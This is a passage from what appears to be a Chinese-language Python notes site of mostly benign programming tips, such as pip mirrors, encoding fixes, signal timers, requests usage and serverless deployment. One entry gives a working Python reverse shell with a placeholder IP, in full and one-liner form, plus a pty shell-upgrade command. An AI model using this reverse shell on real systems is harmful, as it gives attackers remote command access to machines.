mirrors.aliyun.com","text":"<p>\u5982\u679c\u53ea\u9700\u8981\u4e00\u6b21\u6027\u5b89\u88c5\u4e2a\u5305\uff08\u5982Dockerfile\uff09\uff1a </p> <pre><code>pip install -i https://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com\n</code></pre> <p>\u5728Linux\u670d\u52a1\u5668\u4e0a\u5b89\u88c5python\u7684\u5305\u65f6\uff0c\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u5c06pip\u6e90\u6539\u4e3a\u56fd\u5185\u7684\u963f\u91cc\u955c\u50cf\uff08\u8c46\u74e3\u6e90\u4f3c\u4e4e\u4e0d\u518d\u66f4\u65b0\uff09\uff0c\u80fd\u663e\u8457\u63d0\u9ad8\u5305\u7684\u4e0b\u8f7d\u901f\u5ea6</p> <pre><code>mkdir -p ~/.pip\necho \"\"\"\n[global]\nindex-url = http://mirrors.aliyun.com/pypi/simple/\n[install]\ntrusted-host=mirrors.aliyun.com\n\"\"\"&gt;~/.pip/pip.conf\n</code></pre> <p>\u81f3\u4e8eWindows\u7528\u6237\uff0c\u5728\u7528\u6237\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2apip\u76ee\u5f55\uff0c\u5982\uff1aC:\\Users\\chenyuan\\pip\uff0c\u65b0\u5efa\u6587\u4ef6pip.ini\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>[global]\nindex-url = http://mirrors.aliyun.com/pypi/simple/\n[install]\ntrusted-host=mirrors.aliyun.com\n</code></pre>"},{"location":"Python/#shell","title":"\u53cd\u5f39shell","text":"<p>\u9996\u5148\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u7528nc -l \u7aef\u53e3</p> <pre><code>import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(( \"IP\u5730\u5740\" , \u7aef\u53e3 ))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])\n</code></pre> <p>\u5355\u884c\u7248\u672c\uff1a</p> <pre><code>IP=\"x.x.x.x\";PORT=6666;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( IP , PORT ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\n</code></pre>"},{"location":"Python/#tty","title":"\u83b7\u5f97\u4e00\u4e2atty","text":"<pre><code>python -c 'import pty; pty.spawn(\"/bin/sh\")'\n</code></pre>"},{"location":"Python/#requestsip","title":"\u8ba9requests\u4f7f\u7528\u591a\u4e2aIP","text":"<p>requests\u5305\u5e76\u6ca1\u6709\u4f7f\u7528socket.create_connection\u51fd\u6570\uff0c\u6240\u4ee5\u66ff\u6362socket.create_connection\u5e76\u4e0d\u591f</p> <pre><code>def function_hook_parameter(oldfunc, parameter_index, parameter_name, parameter_value):\n\"\"\"\n    \u521b\u9020\u4e00\u4e2awrapper\u51fd\u6570\uff0c\u52ab\u6301oldfunc\u4f20\u5165\u7684\u7b2cparameter_index\u540d\u4e3aparameter_name\u7684\u51fd\u6570\uff0c\u56fa\u5b9a\u5176\u503c\u4e3aparameter_value; \u4e0d\u5f71\u54cd\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684\u4efb\u4f55\u5176\u4ed6\u53c2\u6570\n    \u7528\u6cd5\uff1a \u539f\u51fd\u6570 = function_hook_parameter(\u539f\u51fd\u6570, \u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\u53c2\u6570\u6240\u5904\u7684\u4f4d\u7f6e, \u8fd9\u4e2a\u53c2\u6570\u7684\u540d\u79f0, \u9700\u8981\u66ff\u6362\u6210\u7684\u53c2\u6570\u503c)\n\n    \u4f8b\u5b50\uff1a \u9700\u8981\u52ab\u6301socket.create_connection\u8fd9\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u539f\u578b\u5982\u4e0b\uff1a \n               create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT, source_address=None)\n           \u9700\u8981\u5bf9\u5176\u7b2c3\u4e2a\u53c2\u6570source_address\u56fa\u5b9a\u4e3avalue\uff0c\u52ab\u6301\u65b9\u6cd5\u5982\u4e0b\n               socket.create_connection = function_hook_parameter(socket.create_connection, 3, \"source_address\", value)\n    \"\"\"\n    real_func = oldfunc\n    def newfunc(*args, **kwargs):  # args\u662f\u53c2\u6570\u5217\u8868list\uff0ckwargs\u662f\u5e26\u6709\u540d\u79f0keyword\u7684\u53c2\u6570dict\n        newargs = list(args)\n        if len(args) &gt;= parameter_index:  # \u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u88ab\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u80af\u5b9a\u5176\u524d\u9762\u7684\u53c2\u6570\u90fd\u662f\u65e0\u540d\u79f0\u7684\u53c2\u6570\uff0cargs\u7684\u957f\u5ea6\u80af\u5b9a\u957f\u4e8e\u5176\u6240\u5728\u7684\u4f4d\u7f6e\n            newargs[parameter_index - 1] = parameter_value  # \u7b2c3\u4e2a\u53c2\u6570\u5728list\u7684\u4e0b\u6807\u662f2\n        else:  # \u5982\u679c\u4e0d\u662f\u76f4\u63a5\u4f20\u5165\uff0c\u90a3\u4e48\u5c31\u5728kwargs\u4e2d \u6216\u8005\u4f20\u5165\u7684\u53ef\u9009\u53c2\u6570\u4e2d\u6ca1\u6709\u8fd9\u4e2a\u53c2\u6570\uff0c\u76f4\u63a5\u8bbe\u7f6ekwargs\u5373\u53ef\n            kwargs[parameter_name] = parameter_value\n        return real_func(*newargs, **kwargs)\n    return newfunc\n\n\nmyip = \"x.x.x.x\" #\u4f60\u9700\u8981\u4f7f\u7528\u7684IP\uff0c\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u8fd9\u4e2aIP\nimport socket\nsocket.create_connection = function_hook_parameter(socket.create_connection, 3, \"source_address\", (myip, 0))\nimport requests\nbakup_create_connection = requests.packages.urllib3.util.connection.create_connection #\u5907\u4efd\u4e00\u4efd\u4ee5\u5907\u540e\u7eed\u7ee7\u7eed\u66ff\u6362\nrequests.packages.urllib3.util.connection.create_connection = function_hook_parameter(requests.packages.urllib3.util.connection.create_connection, 3, \"source_address\", (myip, 0))\n\n# \u9a8c\u8bc1\u662f\u5426\u6210\u529f\u4fee\u6539\u6e90IP\nprint(requests.get(\"http://ip.cn\").text) #\u8bbf\u95ee\u7f51\u7ad9\u67e5\u770b\u5f53\u524d\u4f7f\u7528\u7684\u516c\u7f51IP\uff0c\u5982\u679c\u5185\u7f51\u4f60\u53ef\u4ee5\u81ea\u884c\u642d\u5efa\u670d\u52a1\u5668\u67e5\u770b\u8bbf\u95ee\u65e5\u5fd7\u4ece\u800c\u786e\u5b9aIP\n\n# \u5982\u679c\u540e\u7eed\u8fd8\u8981\u8fdb\u884c\u66ff\u6362\uff0c\u5219\u5e94\u8be5\u4f20\u5165bakup_create_connection\nmynewip = \"x.x.x.y\" #\u53e6\u5916\u4e00\u4e2a\u5f53\u524d\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u53d6\u5f97\u7684IP\nrequests.packages.urllib3.util.connection.create_connection = function_hook_parameter(bakup_create_connection, 3, \"source_address\", (mynewip, 0))\n</code></pre>"},{"location":"Python/#python_1","title":"Python\u591a\u7ebf\u7a0b\u6a21\u677f","text":"<p>\u4f7f\u7528threading\u6a21\u5757\u8fdb\u884c\u5f00\u53d1</p> <p>MultiThread_Template.py</p>"},{"location":"Python/#httpserverbasehttpserver","title":"http.server\uff08BaseHTTPServer\uff09\u5e76\u53d1\u6027\u6539\u5584","text":""},{"location":"Python/#new-version","title":"New version \u4e0d\u5fc5\u4fee\u6539\u5e93\u4ee3\u7801","text":"<p>\u5728\u4f7f\u7528BaseHTTPServer.HTTPServer\u7684\u65f6\u5019\uff0c\u5bf9\u5176\u4f7f\u7528\u7684\u7236\u7c7b\u4fee\u6539\u521b\u9020\u81ea\u5df1\u7684\u7c7b\uff0c\u53c2\u8003How to dynamically change base class of instances at runtime?</p> <pre><code>import BaseHTTPServer # \u5982\u679cpy3\uff0c\u9700\u8981import http.server as BaseHTTPServer\nimport socketserver\nMyHTTPServer = type('MyHTTPServer', (socketserver.ThreadingTCPServer,), dict(BaseHTTPServer.HTTPServer.__dict__))\n\ndef MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):\n    pass # \u7701\u7565handler\u7684\u4ee3\u7801\uff0c\u4e00\u4e9bdo_GET\uff0cdo_POST\u7684\u51fd\u6570\n\nhttpd = MyHTTPServer( ('0.0.0.0', 80), MyHandler)\nhttpd.serve_forever()\n</code></pre> <p>\u600e\u4e48\u77e5\u9053MyHTTPServer\u7684\u7236\u7c7b\u786e\u5b9e\u88ab\u4fee\u6539\u4e86\u5462\uff1f \u53ef\u4ee5\u67e5\u770b\u5176__mro__\u5c5e\u6027\uff08Method Resolution Order attribute\uff09</p>"},{"location":"Python/#old-version","title":"Old version \u4fee\u6539\u5e93\u4ee3\u7801(\u4e0d\u5efa\u8bae)","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a\u5229\u7528Python\u4e2dSocketServer \u5b9e\u73b0\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u95f4\u975e\u963b\u585e\u901a\u4fe1</p> <p>\u76f4\u63a5\u4fee\u6539BaseHTTPServer\u7684\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u7ec6\u8282\uff0c\u5c06BaseHTTPServer\u7c7b\u7ee7\u627f\u7684\u539f\u5148\u53ea\u80fd\u652f\u6301\u5355\u4e2a\u8bf7\u6c42\u7684SocketServer.TCPServer\u6539\u4e3a\u6bcf\u4e2a\u8fde\u63a5\u4e00\u4e2a\u7ebf\u7a0b\u7684SocketServer.ThreadingTCPServer\uff0c\u4f7fBaseHTTPServer\u80fd\u652f\u6301\u5e76\u53d1\u800c\u4e0d\u662f\u4e00\u6b21\u53ea\u80fd\u5904\u7406\u5355\u4e2a\u8bf7\u6c42</p> <p>Python3\u7684\u65b9\u6cd5\uff1a</p> <p>\u5728Python3\u4e2dBaseHTTPServer\u6539\u540d\u4e3ahttp.server\u4e86\uff0c\u9996\u5148\u627e\u5230http.server\u6240\u5728\u7684py\u6587\u4ef6\uff1a</p> <pre><code>python3 -c \"import http.server; print(http.server)\"\n</code></pre> <p>\u4fee\u6539\u5176\u63d0\u793a\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u8fd9\u91cc\u662f<code>/usr/lib/python3.4/http/server.py</code></p> <p>\u641c\u7d22<code>class HTTPServer</code>\uff0c\u5982\u679c\u662f\u7528vim\u53ef\u4ee5\u7528<code>/class HTTPServer</code></p> <p>\u4fee\u6539\u627e\u5230\u7684\u8fd9\u4e00\u884c\uff0c\u6539\u4e3a\uff1a</p> <pre><code>class HTTPServer(socketserver.ThreadingTCPServer):\n</code></pre> <p>Python2\u7684\u65b9\u6cd5\uff1a</p> <p>\u9996\u5148\u627e\u5230BaseHTTPServer\u5728\u54ea\uff1a</p> <pre><code> python -c \"import BaseHTTPServer; print(BaseHTTPServer)\"\n</code></pre> <p>\u4fee\u6539\u5bf9\u5e94\u7684\u6587\u4ef6\uff0c\u5982/usr/lib/python2.7/BaseHTTPServer.py\uff0c\u6ce8\u610f\u4e0d\u8981\u6253\u5f00\u4ed6\u76f4\u63a5\u63d0\u793a\u7684pyc\u6587\u4ef6\u800c\u662f\u8981\u5bf9\u5e94\u7684\u540c\u540dpy\u6587\u4ef6</p> <p>\u627e\u5230\u8fd9\u884c\uff08vim\u4e2d\u53ef\u4ee5\u8f93\u5165<code>/class HTTPServer</code>\u8fdb\u884c\u641c\u7d22\uff09\uff1a</p> <pre><code>class HTTPServer(SocketServer.TCPServer):\n</code></pre> <p>\u4fee\u6539\u5176\u7ee7\u627f\u7684\u7236\u7c7b\uff1a</p> <pre><code>class HTTPServer(SocketServer.ThreadingTCPServer):\n</code></pre>"},{"location":"Python/#rootpython","title":"\u65e0root\u6743\u9650\u5b89\u88c5Python","text":"<p>\u4e0b\u8f7d\u6700\u65b0\u7248python\u6e90\u7801\u540e\u6307\u5b9aprefix\u7f16\u8bd1\uff0c\u5047\u8bbe\u7528\u6237\u76ee\u5f55\u4e3a/home/chenyuan</p> <pre><code>apt-get install libssl-dev openssl curl -O https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tgz\ntar -xzf Python-3.5.2.tgz\ncd Python-3.5.2/\n./configure --prefix=/home/chenyuan/python3\nmake\nmake install &gt;/dev/null\npushd /home/chenyuan/python3/bin\ncp python3 python\ncp pip3 pip\nalias python3=`pwd`/python\nalias pip3=`pwd`/pip\n</code></pre>"},{"location":"Python/#_1","title":"\u4e2d\u6587\u8f93\u51fa\u4e71\u7801\u95ee\u9898","text":"<p>\u65b9\u6cd51\uff1a\u8fd0\u884cpy\u524d\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf</p> <pre><code>export PYTHONIOENCODING=utf8\n</code></pre> <p>\u65b9\u6cd52\uff1a\u5f3a\u5236\u4fee\u6539stdout</p> <pre><code>import sys\nsys.stdout=open(1, 'w', encoding='utf-8', closefd=False)\n</code></pre>"},{"location":"Python/#pep8","title":"\u9075\u5faaPEP8\u68c0\u67e5\u4f60\u7684\u4ee3\u7801","text":"<p>pycodestyle</p> <p>\u5b89\u88c5\u5e76\u4f7f\u7528pycodestyle\u68c0\u67e5\u4ee3\u7801\uff0c\u5ffd\u7565E501\u4e00\u884c\u4e0d\u80fd\u957f\u4e8e80\u4e2a\u5b57\u7b26\u7684\u9650\u5236\uff1a</p> <pre><code>pip install pycodestyle\npycodestyle --show-source --ignore=E501 yourcode.py\n</code></pre>"},{"location":"Python/#_2","title":"\u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32","text":"<pre><code>import random\nimport string\ndef random_str(length=8):\n    return \"\".join(random.sample(string.ascii_letters, length))\n</code></pre> <pre><code>from random import Random\ndef random_str(randomlength=8):\n    str = ''\n    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'\n    length = len(chars) - 1\n    random = Random()\n    for i in range(randomlength):\n        str+=chars[random.randint(0, length)]\n    return str\n</code></pre>"},{"location":"Python/#python_2","title":"Python\u89e3\u65b9\u7a0b","text":"<p>\u9700\u8981 <code>pip install sympy</code></p> <pre><code>from sympy import *\n# \u89e3\u4e00\u5143\u65b9\u7a0b\uff1a\n#   2x^2-18=0\nx=Symbol('x')\nprint(solve(2*x**2-18,x))\n# \u5f97\u5230[-3,3]\n\n# \u89e3\u65b9\u7a0b\u7ec4\n#   y=1-x\n#   3x+2y-5\nx,y=symbols('x y')\nprint(solve([ y-1+x, 3*x+2*y-5 ], [ x , y ]))\n# \u5f97\u5230{x: 3, y: -2}\n</code></pre>"},{"location":"Python/#in","title":"\u5927\u6570\u636e\u5224\u65adin","text":"<p>\u4e00\u5b9a\u8981\u7528set\uff0c\u56e0\u4e3aset\u7684in\u64cd\u4f5c\u662fO(1)\u7684\uff0c\u7528list\u662fO(n)\u901f\u5ea6\u592a\u6162</p>"},{"location":"Python/#pythonh-no-such-file-or-directory","title":"\u89e3\u51b3Python.h: No such file or directory","text":"<pre><code>apt-get install -y python-dev python3-dev\n</code></pre> <p>\u5982\u679c\u4e3aCentOS\u7cfb\u7edf\uff1a</p> <pre><code>yum install python-devel\n</code></pre>"},{"location":"Python/#_3","title":"\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u666e\u901a\u5b57\u7b26\u4e32","text":"<p>\u65b9\u6cd5\u4e00\uff1a\u5c06\u5b57\u7b26\u4e32\u6bcf8\u4e2a\u5206\u6210\u4e00\u7ec4\uff0c\u7528int\u8f6c10\u8fdb\u5236\uff0c\u518d\u7528chr\u8f6c\u4e3aascii\u5b57\u7b26</p> <pre><code>s=\"0110001101111001\"\nans=\"\"\nfor i in range(0,len(s)//8):\n    x = s[i*8:i*8+8]\n    ans+=chr(int(x,2))\n</code></pre> <p>\u65b9\u6cd5\u4e8c\uff1a\u5229\u7528binascii\uff0c\u5148\u7528int\u8f6c\u4e3a10\u8fdb\u5236\uff0c\u7136\u540e\u8f6c\u4e3a16\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u8c03\u7528unhexlify\u6267\u884c\u7ffb\u8bd1</p> <pre><code>import binascii\ns=\"0110001101111001\"\nans=binascii.unhexlify('%x'%int(s,2)).decode()\n</code></pre> <p>\u8865\u5145\uff1a\u76f8\u5e94\u7684\u5982\u679c\u8981\u628a\u5341\u8fdb\u5236\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u53ef\u4ee5\u7528bin(123)[2:]</p>"},{"location":"Python/#bytes","title":"\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6cbytes\u5b57\u7b26\u4e32","text":"<pre><code>from base64 import b16encode,b16decode\nprint( b16encode(b'py3.io').decode() ) #output: 7079332E696F\nprint( b16decode(\"7079332E696F\".upper()) ) #output: b'py3.io', \u8fd9\u91cc\u4f7f\u7528upper\u8f6c\u5927\u5199\n</code></pre> <p>\u76f8\u5e94\u7684\uff0c\u62ff\u5230\u4e00\u4e2a\u5341\u8fdb\u5236\u6570\uff0c\u8f6c\u5b57\u7b26\u4e32\uff1a</p> <pre><code>key = 5287002131074331513\nprint( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'\n</code></pre>"},{"location":"Python/#python3pat","title":"\u7528Python3\u5199PAT\u5fc3\u5f97","text":"<ul> <li> <p>\u5982\u679c\u53d1\u751f\u683c\u5f0f\u9519\u8bef\uff0c\u68c0\u67e5\u8f93\u51fa\u7684\u6700\u540e\u4e00\u884c\u7684print\uff0c\u52a0\u4e0aend=\u201d\u201c\u8868\u793a\u4e0d\u8981\u6362\u884c</p> </li> <li> <p>\u5982\u679c\u6570\u636e\u89c4\u6a21\u5927\u5bfc\u81f4\u8d85\u65f6\uff0c\u4ee3\u7801\u4e2d\u7684in\u64cd\u4f5c\u524d\u5148\u628alist\u8f6c\u4e3aset\uff0c\u80fd\u5927\u5e45\u5ea6\u63d0\u901f</p> </li> </ul>"},{"location":"Python/#requestspost","title":"\u7528requests\u8fdb\u884cpost","text":"<p>\u9700\u8981\u6ce8\u610f\u52a0\u4e0a\u8fd9\u4e24\u4e2a\u53c2\u6570\uff1a</p> <pre><code>,allow_redirects=False,headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n</code></pre> <p>\u767b\u5f55\u8bf7\u6c42\u7684\u65f6\u5019\u662f\u8981\u6839\u636e\u8fd4\u56de\u7684headers\u91cc\u9762Location\u6709\u6ca1\u6709\u5bf9\u4e0d\u5bf9\u6765\u5224\u65ad\u767b\u5f55\u662f\u5426\u6210\u529f\u7684\uff0c\u800crequests\u9ed8\u8ba4\u4f1a\u8ddf\u968f301/302\u8df3\u8f6c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u83b7\u53d6\u5230\u8df3\u8f6c\u8bf7\u6c42\u7684headers\uff0c\u6240\u4ee5\u52a0\u4e0a<code>allow_redirects=False</code></p> <p>\u53e6\u5916\u5c31\u662fpost\u6570\u636e\u7684\u65f6\u5019\u5fc5\u987b\u7ed9\u51fa\u6b63\u786e\u7684Content-Type\uff0c\u5426\u5219\u670d\u52a1\u5668\u4e0d\u8ba4\u8fd9\u4e2apost\u7684</p> <p>\u518d\u8005\u5c31\u662f\u53ef\u80fd\u5bf9\u65b9\u6709\u53cd\u722c\u866b\u63aa\u65bd\uff0c\u52a0\u4e0aReferer\u548cUser-Agent\u5c31\u597d\u54af</p> <p>\u5982\u679c\u9700\u8981\u63d0\u4ea4\u7684\u662fjson\u7684\u6570\u636e\uff0c\u8bb0\u5f97post\u7684data\u7684\u5355\u53cc\u5f15\u53f7\u8981\u6b63\u786e\uff0c\u5e94\u8be5\u7528json.dumps\u7684\u7ed3\u679c\u53bbpost</p> <p>\u5982\u679c\u8981\u505a\u722c\u866b\uff0c\u6b22\u8fce\u4f7f\u7528\u6211\u7684EasyLogin\uff0c\u65e0\u9700\u518d\u64cd\u5fc3\u8fd9\u4e9b\u7ec6\u8282\uff0c\u4e13\u6ce8\u4e8e\u6838\u5fc3\u722c\u866b\u4ee3\u7801</p>"},{"location":"Python/#tkinter","title":"\u901a\u8fc7tkinter\u83b7\u53d6\u3001\u4fee\u6539\u526a\u8d34\u677f","text":"<p>\u652f\u6301py2\u548cpy3\uff0cLearned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter</p> <pre><code>try:\n    from tkinter import Tk\nexcept ImportError:\n    from Tkinter import Tk\nroot = Tk()\nroot.withdraw() #\u9690\u85cfTk\u7684\u7a97\u53e3\ntext = \"Donnerwetter\"\n# \u6e05\u7a7a\u526a\u8d34\u677f clear clipboard\nroot.clipboard_clear()\n# \u5199\u5165\u526a\u8d34\u677f write text to clipboard\nroot.clipboard_append(text)\n# \u8bfb\u53d6\u526a\u8d34\u677f text from clipboard\nclip_text = root.clipboard_get()\nprint(clip_text)  # --&gt; Donnerwetter\n</code></pre>"},{"location":"Python/#_4","title":"\u7b26\u53f7\u6570\u4e0e\u65e0\u7b26\u53f7\u6570\u8f6c\u6362","text":""},{"location":"Python/#_5","title":"\u65e0\u7b26\u53f7\u2192\u6709\u7b26\u53f7\uff0c\u4e3a\u4e86\u52a0\u4e0a\u8d1f\u53f7\uff1a","text":"<pre><code>import ctypes\nctypes.c_int64(17039472050328044269).value\n</code></pre> <p>\u4e0a\u8ff0\u5c06\u5f97\u5230-1407272023381507347</p>"},{"location":"Python/#_6","title":"\u6709\u7b26\u53f7\u2192\u65e0\u7b26\u53f7\uff0c\u4e3a\u4e86\u53bb\u6389\u8d1f\u53f7\uff1a","text":"<pre><code>import ctypes\nctypes.c_uint64(-1407272023381507347).value\n</code></pre> <p>\u4e0a\u8ff0\u5c06\u5f97\u523017039472050328044269</p>"},{"location":"Python/#signalsigalrm-only-linux","title":"\u4f7f\u7528signal.SIGALRM\u5728\u9650\u5b9a\u65f6\u95f4\u540e\u9000\u51fa\u8fdb\u7a0b (only Linux)","text":"<p>\u5728\u8bbe\u8ba1CTF\u7684\u9898\u76ee\u7684\u65f6\u5019\uff0c\u6709\u5fc5\u8981\u9650\u5236\u7528\u6237\u7684\u8fde\u63a5\u65f6\u95f4\uff0c\u8fd9\u65f6\u5019\u7b80\u5355\u65b9\u6848\u5c31\u662f\u7528SIGALRM\u4fe1\u53f7\u54af</p> <pre><code>def clock(timeout=5):\n    import signal\n    def signal_handler(signum,data):\n        if signum == signal.SIGALRM:\n            print(\"Time is up!\")\n            exit()\n    signal.signal(signal.SIGALRM, signal_handler)\n    signal.alarm(int(timeout))\n</code></pre>"},{"location":"Python/#ctrlc","title":"\u6355\u6349\u7528\u6237\u7684Ctrl+C","text":"<p>\u7279\u6b8a\u60c5\u51b5\u4e0b\u6211\u4eec\u60f3\u5c4f\u853d\u6389Ctrl+C\uff0c\u8fd9\u65f6\u5019\u5199\u4e2a\u81ea\u5df1\u7684\u51fd\u6570\u5904\u7406SIGALRM\u4fe1\u53f7\u5c31\u597d\u5566</p> <pre><code>import signal\n\ndef signal_handler(signum,data):\n    if signum == signal.SIGINT:\n        print(\"Ctrl+C is pressed!\")\n        #raise KeyboardInterrupt\n\nif __name__ == '__main__':\n    signal.signal(signal.SIGINT, signal_handler)\n    sleep(666)\n</code></pre>"},{"location":"Python/#signalsigalrm-only-linux_1","title":"\u4f7f\u7528signal.SIGALRM\u5b9e\u73b0\u5b9a\u65f6\u5668 (only Linux)","text":"<p>\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u4f3cJavascript\u7684setInterval\u529f\u80fd</p> <pre><code>import signal\nfrom time import sleep\nINTERVAL=1\nCOUNT=0\ndef signal_handler(signum,data):\n    global COUNT\n    if signum == signal.SIGALRM:\n        # \u4f60\u7684\u5b9a\u65f6\u5668\u4ee3\u7801\u5199\u5728\u8fd9\u91cc Your function here\n        print(\"Count! {}\".format(COUNT))\n        COUNT+=1\n        signal.alarm(int(INTERVAL)) #\u518d\u8bbe\u7f6e\u4e00\u4e2aclock\u5c31\u80fd\u5faa\u73af\u5f80\u590d\u54af\n\nif __name__ == '__main__':\n    signal.signal(signal.SIGALRM, signal_handler)\n    signal.alarm(int(INTERVAL))\n    sleep(23333)\n</code></pre>"},{"location":"Python/#pdb","title":"\u4f7f\u7528pdb\u8fdb\u884c\u8c03\u8bd5","text":"<p>\u5728\u9700\u8981\u8c03\u8bd5\u7684\u6587\u4ef6\u5934\u90e8\u52a0\u5165</p> <pre><code>import pdb\n</code></pre> <p>\u9700\u8981\u505c\u4e0b\u6765\u7684\u5730\u65b9\u52a0\u5165</p> <pre><code>pdb.set_trace()\n</code></pre> <p>Tutorial: https://github.com/spiside/pdb-tutorial</p>"},{"location":"Python/#pythonserverlessfunction-as-service","title":"\u4f7f\u7528Python\u5f00\u53d1Serverless(Function as Service)\u540e\u7aef\u670d\u52a1","text":"<p>\u9879\u76ee\u5730\u5740 &amp; \u90e8\u7f72\u8fc7\u7a0b</p> <p>\u5982\u679c\u60a8\u53ea\u662f\u9700\u8981\u90e8\u7f72\u4e00\u4e2aExample\uff0c\u2191\u2191\u2191(\u987a\u624b\u6c42\u4e2aStar)\uff1b\u5982\u679c\u60a8\u5bf9\u8fd9\u4e2a\u4ee3\u7801\u662f\u5982\u4f55\u5199\u51fa\u6765\u7684\u548c\u8e29\u5751\u8fc7\u7a0b\u611f\u5174\u8da3\uff0c\u7ee7\u7eed\u770b\u5427\uff1a</p>"},{"location":"Python/#_7","title":"\u8e29\u8fc7\u7684\u5751\u4e0e\u89e3\u51b3\u8fc7\u7a0b(\u8bba\u963f\u91cc\u4e91\u662f\u600e\u4e48\u628a\u4eba\u6c14\u6b7b\u7684)","text":""},{"location":"Python/#1api","title":"1.API\u7f51\u5173\u4e0e\u51fd\u6570\u8ba1\u7b97\u7684\u5bf9\u63a5","text":"<p>\u6309\u7167\u6559\u7a0b\uff0c\u5f53\u65f6\u4e0d\u591f\u8010\u5fc3\uff0c\u62ff\u7740hello world\u7684\u7a0b\u5e8f\uff08\u4e0d\u8981\u4fe1\u6559\u7a0b\u4e2d\u76842.1\u90e8\u5206\u7684\u622a\u56fe\uff09\u5c31\u5728\u4f7f\u7528API\u7f51\u5173\uff0c\u7ed3\u679c\u603b\u662f\u8fd4\u56de503</p> <p>\u8010\u5fc3\u4e0b\u6765\u770b\u6587\u6863\u628a\u7a0b\u5e8f\u6539\u4e3a\u540e\u9762\u7684\u649e\u5899\u5f0f\u7a0b\u5e8f\u5c31\u597d\u4e86\uff0c\u4eba\u5bb6\u5176\u5b9e\u8bf4\u4e86\u51fd\u6570\u8ba1\u7b97\u5e94\u8be5\u8fd4\u56de\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4e0d\u6309\u7167\u8fd9\u4e2a\u7ed3\u6784\u6765\u5c31\u4f1a503\uff1a</p> <pre><code>{\n    \"isBase64Encoded\": True\u6216\u8005False,\n    \"statusCode\": 200, #\u53ef\u4ee5\u4e3a302\u6765\u5b9e\u73b0\u8df3\u8f6c\n    \"headers\": {...} #\u8fd4\u56de\u7684response headers\uff0c\u4f46\u5176\u4e2d\u7684Content-Type\u6ca1\u6709\u4f5c\u7528\n    \"body\": \"...\" #\u8fd4\u56de\u7684\u7f51\u9875\u6b63\u6587\u5185\u5bb9\n}\n</code></pre>"},{"location":"Python/#2api","title":"2.\u4fee\u6539API\u7f51\u5173\u53c2\u6570\u5b9a\u4e49\u540e\u8981\u518d\u6b21\u53d1\u5e03","text":"<p>\u65e0\u8bba\u6709\u6ca1\u6709\u6539Mock\u8bbe\u7f6e\uff0c\u53ea\u8981\u6539\u52a8\u4e86\u8bbe\u7f6e\u90fd\u9700\u8981\u91cd\u65b0\u53d1\u5e03\uff0c\u53d1\u5e03\u7ebf\u4e0a\u7248\u672c\u5373\u53ef</p>"},{"location":"Python/#3windowsfclifcliexe","title":"3.\u4e0d\u80fd\u4f7f\u7528Windows\u7248\u672c\u7684fcli\u5de5\u5177(fcli.exe)","text":"<p>\u4eba\u5bb6\u5df2\u7ecf\u53d1\u5e03\u4e86\u65b0\u7248\u672c\u7684fcli\u89e3\u51b3\u4e86\u6b64\u95ee\u9898</p> <p>\u8fd9\u4e2abug\u7b80\u76f4\u4e86\uff0c\u6574\u4e2a\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>\u6309\u7167\u6587\u6863\u8bf4\u660e\u4e00\u8def\u90e8\u7f72\u4e0a\u4f20\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u5374\u8bf4<code>Unable to import module 'index'</code></p> <p>\u7136\u540e\u6211\u5c31\u5728Linux\u670d\u52a1\u5668\u4e0a<code>docker pull python:2.7</code>\u7136\u540e<code>docker run -it --rm -v /root/ical:/code</code> python:2.7 /bin/bash<code>\uff0c\u8fdb\u5165bash\u540e</code>cd /code; python<code>\uff0c\u8fdb\u5165python\u540e</code>import index`</p> <p>\u554a\u54c8\uff0c\u53d1\u73b0\u662f<code>ImportError: No module named 'bs4'</code>\uff0c\u81ea\u5df1\u7684\u9505\uff0c\u7528<code>pip install bs4 -t 